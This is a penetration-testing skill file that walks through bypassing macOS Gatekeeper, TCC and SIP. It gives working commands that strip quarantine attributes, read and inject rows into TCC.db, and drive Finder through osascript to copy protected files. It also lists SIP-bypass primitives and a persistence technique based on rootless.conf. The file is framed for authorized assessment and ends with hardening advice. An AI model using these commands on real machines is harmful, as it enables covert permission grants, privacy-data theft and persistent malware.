---
name: bypassing-macos-gatekeeper-tcc-and-sip
description: Assessing and bypassing macOS userland and platform security controls during authorized engagements -
  Gatekeeper/quarantine notarization checks, the TCC (Transparency, Consent & Control) privacy database, System
  Integrity Protection (SIP/rootless), and the App Sandbox - using codesign, spctl, xattr, sqlite3 against TCC.db,
  csrutil, sandbox-exec, and AppleEvents/Automation abuse.
domain: cybersecurity
subdomain: macos-security
tags:
- penetration-testing
- macos
- security-controls-bypass
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Bypassing macOS Gatekeeper, TCC, and SIP

## When to Use

- During authorized macOS assessments evaluating the strength of platform protections
- When testing whether downloaded/quarantined payloads can evade Gatekeeper and notarization
- When an app holds (or can obtain) TCC permissions like Full Disk Access, camera, or Automation
- When assessing SIP integrity, rootless entitlements, and sealed system volume protections
- When a process runs inside the App Sandbox and you need to map or escape its profile

## Critical: Techniques Most Often Missed

### 1. Gatekeeper only checks quarantined files

Gatekeeper/notarization checks run **only on files carrying the `com.apple.quarantine` xattr**. Files written by non-quarantining tools (many BitTorrent clients) or with the attribute stripped skip the check entirely. AMFI re-verifies signatures on subsequent launches, but Gatekeeper itself is not run every time.

```bash
xattr file.app                                 # is com.apple.quarantine present?
xattr -l portada.png                           # inspect quarantine value + writing app
xattr -d com.apple.quarantine payload.app      # strip it (needs the file writable)
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
spctl --assess -vv /Applications/App.app       # what Gatekeeper would decide
```

**How to CONFIRM:** `xattr` shows no `com.apple.quarantine` (or it was removed), and `spctl --assess` returns `accepted`/no prompt; the app launches without the first-run dialog.

### 2. TCC.db is the source of truth — read it from a privileged context

Approvals live in SQLite: the SIP-protected system DB `/Library/Application Support/com.apple.TCC/TCC.db` and the per-user `$HOME/Library/Application Support/com.apple.TCC/TCC.db`. Both are TCC-protected for read, so query them from an FDA/privileged process.

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "select service, client, auth_value, auth_reason from access;"
# Find everything granted Full Disk Access:
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "select client from access where service='kTCCServiceSystemPolicyAllFiles' and auth_value=2;"
```

`auth_value`: denied(0), unknown(1), allowed(2), limited(3). With write access to a TCC.db you can `INSERT` an `access` row (service, client, client_type 0=bundleid/1=path, auth_value 2, valid `csreq` blob) to grant yourself a permission.

**How to CONFIRM:** the row exists with `auth_value=2` and a matching `csreq`; the target app then exercises the permission without prompting.

### 3. Automation (AppleEvents) → Finder's implicit Full Disk Access

`kTCCServiceAppleEvents` over `com.apple.Finder` lets you drive Finder, which **always has FDA** (even though it isn't shown in the UI), to copy TCC-protected files.

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

**How to CONFIRM:** `TCC.db` (or other protected files) appears in `/tmp`; check the access row `select * from access where service='kTCCServiceAppleEvents' and client LIKE '%yourapp%'`.

## Workflow

### Step 1: Inspect signing, notarization, and entitlements

```bash
codesign -vv -d /Applications/App.app 2>&1 | grep -E "Authority|TeamIdentifier"
codesign --verify --verbose /Applications/App.app          # tamper check
codesign -d --entitlements :- /Applications/App.app        # TCC-relevant entitlements
spctl --assess --verbose /Applications/App.app             # notarization/Gatekeeper verdict
```

Apps need the relevant entitlement (e.g., `com.apple.security.device.camera`) even to request a resource. Apple apps carry pre-granted `com.apple.private.tcc.allow` and never prompt or appear in TCC.db.

### Step 2: Enumerate Gatekeeper policy and the syspolicy DB

```bash
spctl --status                       # assessments enabled?
sudo spctl --list                    # current rules
sqlite3 /var/db/SystemPolicy "SELECT requirement,allow,disabled,label FROM authority WHERE label!='GKE' AND disabled=0;"
log stream --style syslog --predicate 'process == "syspolicyd"'   # live decisions
```

Note: from macOS 15 Sequoia, `spctl --master-disable/--global-disable` no longer work; policy is managed via System Settings or an MDM `com.apple.systempolicy.control` profile. The Finder Ctrl+Open bypass is removed.

### Step 3: Hunt and exercise TCC grants

```bash
# both DBs (from an FDA context)
for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
          "/Library/Application Support/com.apple.TCC/TCC.db"; do
  sqlite3 "$db" "select service, client, auth_value from access where auth_value=2;"
done
tccutil reset All com.some.bundle.id        # users may reset/query rules
```

Check the `com.apple.macl` xattr (drag-and-drop grants store an app UUID; SIP-protected, removable only via zip/delete/unzip). Map a process's effective grants via its responsible process.

### Step 4: Assess SIP and rootless protections

```bash
csrutil status                              # SIP enabled?
csrutil authenticated-root status           # sealed system volume
ls -lOd /usr/libexec                        # 'restricted' flag = SIP-protected
ls -lOd /usr/libexec/cups                   # 'sunlnk' = undeletable
cat /System/Library/Sandbox/rootless.conf   # protected paths; * = exception
```

Look for SIP-bypass primitives: entitlement `com.apple.rootless.install[.heritable]` (Shrootless / CVE-2022-26712), `system_installd` sourcing `/etc/zshenv` during Apple-signed pkg installs, `systemmigrationd` honoring `BASH_ENV`/`PERL5OPT`, or a non-existent path listed in `rootless.conf` you can create. A `rootless.conf` entry that doesn't yet exist (e.g., a plist under `/System/Library/LaunchDaemons`) can be created for SIP-resident persistence.

### Step 5: Map and escape the App Sandbox

Any binary with `com.apple.security.app-sandbox` runs sandboxed; containers live in `~/Library/Containers/{BundleID}`. Profiles use SBPL (Scheme). On macOS, processes opt in to the sandbox themselves.

```bash
# run a binary under a custom profile and trace every check
cat > /tmp/trace.sb <<'EOF'
(version 1)
(trace /tmp/trace.out)
EOF
sandbox-exec -f /tmp/trace.sb /bin/ls
log show --style syslog --predicate 'eventMessage contains[c] "sandbox"' --last 30s
# inspect a running PID's sandbox state (platform binaries / sbtool)
sbtool <pid> inspect
```

Review system profiles in `/System/Library/Sandbox/Profiles/*.sb` and `/usr/share/sandbox/`. App Store apps use `application.sb`. Anything a sandboxed app creates gets the quarantine attribute.

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Gatekeeper** | Verifies developer signature + Apple notarization before first run; enforced by `syspolicyd` |
| **Quarantine xattr** | `com.apple.quarantine` flag; Gatekeeper checks ONLY quarantined files |
| **Notarization** | Apple Notary Service ticket "stapled" to apps; absence/strip can skip checks |
| **TCC** | Privacy framework gating camera, mic, FDA, Automation, etc.; state in TCC.db SQLite |
| **csreq** | Code-signing requirement blob in TCC.db binding a grant to a specific signed binary |
| **Entitlements** | Plist capabilities in the code signature; required to even request a TCC resource |
| **SIP / rootless** | Kernel-enforced protection of system paths; flags `restricted`/`sunlnk`, config `rootless.conf` |
| **Sealed System Volume** | Cryptographically signed, read-only system snapshot mounted at `/` |
| **App Sandbox (Seatbelt)** | MACF-enforced profile (SBPL) limiting a process to allowed operations |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **codesign** | Inspect signature, TeamID, entitlements; verify tampering |
| **spctl** | Query Gatekeeper status, assess apps, manage labels (read-only on Sequoia+) |
| **xattr** | View/strip `com.apple.quarantine` and `com.apple.macl` attributes |
| **sqlite3** | Read/modify TCC.db `access` table and the `/var/db/SystemPolicy` authority table |
| **tccutil** | Reset/query TCC permissions |
| **csrutil** | Check SIP and sealed-root status (configured only in recovery) |
| **osascript** | Drive AppleEvents/Automation (Finder/Automator) to abuse FDA |
| **sandbox-exec / sbtool** | Run under a profile, trace sandbox checks, inspect a PID's sandbox state |
| **log stream/show** | Observe syspolicyd, XProtect, and sandbox decisions |

## Common Scenarios

### Scenario 1: Quarantine strip
A payload downloaded outside a quarantining app (or after `xattr -d com.apple.quarantine`) launches without any Gatekeeper prompt because no quarantine flag triggers the check.

### Scenario 2: FDA app abused to copy TCC.db
An app with Full Disk Access (or Automation over Finder) reads the system TCC.db and stages it, enabling offline analysis of all granted privacy permissions.

### Scenario 3: TCC.db row injection
With write access to a user TCC.db, an attacker inserts an `access` row with `auth_value=2` and a valid `csreq`, silently granting a controlled app a sensitive permission.

### Scenario 4: SIP-resident persistence via rootless.conf gap
A path listed in `rootless.conf` that does not yet exist (e.g., a LaunchDaemon plist) is created, planting a payload in a SIP-protected location resistant to removal.

## Output Format

```
## macOS Protection Bypass Finding

**Vulnerability**: TCC bypass via Automation → Finder Full Disk Access
**Severity**: High (CVSS 7.7)
**Control**: Transparency, Consent & Control (TCC)
**Host**: macHost.local (macOS 14.4, SIP enabled)

### Reproduction Steps
1. App holds kTCCServiceAppleEvents over com.apple.Finder
2. osascript drives Finder (implicit FDA) to duplicate TCC.db to /tmp
3. sqlite3 dumps all granted privacy permissions

### Evidence
| Artifact | Detail |
|----------|--------|
| Granting row | kTCCServiceAppleEvents / <bundleid> / auth_value=2 |
| Exfiltrated | /tmp/TCC.db (system, normally SIP/TCC protected) |
| Verdict | spctl --assess: accepted (notarized) |

### Recommendation
1. Restrict Automation grants; review apps with FDA / AppleEvents over Finder
2. Keep SIP enabled; monitor TCC.db and com.apple.macl integrity
3. Enforce Gatekeeper via MDM com.apple.systempolicy.control profile
4. Alert on quarantine-attribute removal and syspolicyd anomalies
5. Sandbox third-party apps and minimize entitlement grants
```
